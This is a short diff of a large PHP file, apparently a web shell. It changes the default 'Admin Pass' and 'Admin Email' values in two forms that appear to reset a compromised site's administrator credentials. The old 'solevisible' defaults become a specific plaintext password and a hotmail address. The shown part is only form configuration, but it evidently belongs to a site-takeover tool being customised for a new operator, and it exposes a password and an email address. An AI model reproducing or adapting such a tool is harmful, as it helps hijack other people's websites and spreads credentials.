@@ -3904,9 +3904,9 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'biringsayang45', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'matiganndu@hotmail.com', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form>';
@@ -3947,9 +3947,9 @@ $table = array('td1' =>
  'td6' =>
  array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
+ array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'biringsayang45', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'matiganndu@hotmail.com', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
